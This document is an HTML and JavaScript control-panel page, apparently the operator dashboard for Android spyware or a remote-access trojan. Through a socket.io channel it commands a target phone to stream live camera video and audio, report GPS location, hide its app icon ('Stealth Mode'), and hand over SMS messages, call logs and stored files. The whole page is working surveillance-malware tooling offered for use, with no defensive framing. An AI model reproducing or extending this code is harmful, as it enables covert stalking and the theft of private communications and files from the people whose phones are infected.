<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Device Monitor</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0b0b0b; color: #e0e0e0; margin: 0; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #222; padding-bottom: 15px; margin-bottom: 20px; }
        
        .status-badge { padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; }
        .online { background: #1b4332; color: #8efea1; }
        .offline { background: #431b1b; color: #fe8e8e; }

        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
        .card { background: #161616; border: 1px solid #222; border-radius: 12px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        
        /* Video Window */
        .video-box { background: #000; width: 100%; height: 400px; border-radius: 8px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
        #live-frame { width: 100%; height: 100%; object-fit: contain; display: none; }
        .video-overlay { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.6); padding: 5px 10px; border-radius: 4px; font-size: 12px; color: #ff0000; }

        /* Buttons */
        .btn-group { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 15px; }
        button { flex: 1; min-width: 120px; padding: 10px; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; transition: 0.2s; background: #333; color: white; }
        button:hover { opacity: 0.8; }
        .btn-blue { background: #007bff; }
        .btn-green { background: #28a745; }
        .btn-red { background: #dc3545; }
        .btn-yellow { background: #f39c12; }

        /* Logs & Tables */
        .log-container { background: #000; height: 200px; overflow-y: auto; padding: 10px; font-family: monospace; font-size: 12px; border-radius: 6px; border: 1px solid #333; margin-top: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #222; }
        th { color: #888; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h2>Monitor Dashboard v2.0</h2>
        <div id="status-badge" class="status-badge offline">DISCONNECTED</div>
    </div>

    <div class="grid">
        <div class="card" style="grid-column: span 2;">
            <h3>üî¥ Live Control Window</h3>
            <div class="video-box">
                <div class="video-overlay" id="stream-indicator" style="display:none;">LIVE FEED</div>
                <img id="live-frame" src="" alt="Live Stream">
                <div id="placeholder-text">Camera Feed Offline</div>
            </div>
            <div class="btn-group">
                <button class="btn-blue" onclick="sendCmd('start-video-only')">üìπ Video Only</button>
                <button class="btn-green" onclick="sendCmd('start-audio-video')">üéôÔ∏è Audio + Video</button>
                <button class="btn-red" onclick="sendCmd('stop-stream')">üõë Stop Stream</button>
            </div>
        </div>

        <div class="card">
            <h3>üìä System Info</h3>
            <p>Battery: <strong id="battery-txt">--%</strong></p>
            <p>Location: <span id="location-txt">Unknown</span></p>
            <div class="btn-group">
                <button onclick="sendCmd('get-gps')">üìç Update GPS</button>
                <button class="btn-yellow" onclick="sendCmd('hide-icon')">üëª Stealth Mode</button>
                <button onclick="sendCmd('show-icon')">üëÅÔ∏è Show Icon</button>
            </div>
        </div>

        <div class="card">
            <h3>üìÇ Data Extraction</h3>
            <div class="btn-group">
                <button onclick="sendCmd('get-sms')">üì© Fetch SMS</button>
                <button onclick="sendCmd('get-calls')">üìû Fetch Calls</button>
            </div>
            <div id="data-display" class="log-container">
                > Waiting for data...
            </div>
        </div>

        <div class="card">
            <h3>üìÅ File Explorer</h3>
            <div id="file-list" class="log-container" style="height: 150px;">
                > Storage not scanned...
            </div>
            <div class="btn-group">
                <button class="btn-blue" onclick="sendCmd('get-files')">Scan Storage</button>
            </div>
        </div>
    </div>
</div>

<script>
    const socket = io();
    const statusBadge = document.getElementById('status-badge');
    const logBox = document.getElementById('data-display');

    socket.on('connect', () => {
        statusBadge.className = "status-badge online";
        statusBadge.innerText = "CONNECTED";
    });

    socket.on('disconnect', () => {
        statusBadge.className = "status-badge offline";
        statusBadge.innerText = "DISCONNECTED";
    });

    function sendCmd(cmd) {
        socket.emit('phone-execute', cmd);
    }

    // --- VIDEO HANDLER ---
    socket.on('data-stream', (base64) => {
        document.getElementById('placeholder-text').style.display = 'none';
        document.getElementById('stream-indicator').style.display = 'block';
        const img = document.getElementById('live-frame');
        img.style.display = 'block';
        img.src = "data:image/jpeg;base64," + base64;
    });

    // --- AUDIO HANDLER ---
    socket.on('audio-stream', (base64) => {
        const audioBlob = base64ToBlob(base64, 'audio/wav');
        const url = URL.createObjectURL(audioBlob);
        const audio = new Audio(url);
        audio.play().catch(e => console.log("Audio play blocked by browser. Interaction needed."));
    });

    function base64ToBlob(base64, type) {
        const bin = atob(base64);
        const len = bin.length;
        const arr = new Uint8Array(len);
        for (let i = 0; i < len; i++) arr[i] = bin.charCodeAt(i);
        return new Blob([arr], { type: type });
    }

    // --- BATTERY & LOCATION ---
    socket.on('battery-update', (data) => {
        document.getElementById('battery-txt').innerText = data + "%";
    });

    socket.on('location-update', (data) => {
        document.getElementById('location-txt').innerHTML = 
            `<a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" style="color:#007bff">View on Maps</a>`;
    });

    // --- SMS & CALLS TABLE GENERATOR ---
    socket.on('sms-data', (data) => {
        const logs = JSON.parse(data);
        let html = "<table><tr><th>From</th><th>Body</th></tr>";
        logs.forEach(msg => {
            html += `<tr><td>${msg.from}</td><td>${msg.body}</td></tr>`;
        });
        logBox.innerHTML = html + "</table>";
    });

    socket.on('call-data', (data) => {
        const logs = JSON.parse(data);
        let html = "<table><tr><th>Number</th></tr>";
        logs.forEach(call => {
            html += `<tr><td>${call.num}</td></tr>`;
        });
        logBox.innerHTML = html + "</table>";
    });

    // --- FILE DOWNLOADER ---
    socket.on('file-download-ready', (file) => {
        const link = document.createElement('a');
        link.href = "data:application/octet-stream;base64," + file.data;
        link.download = file.name;
        link.click();
    });

</script>
</body>
</html>
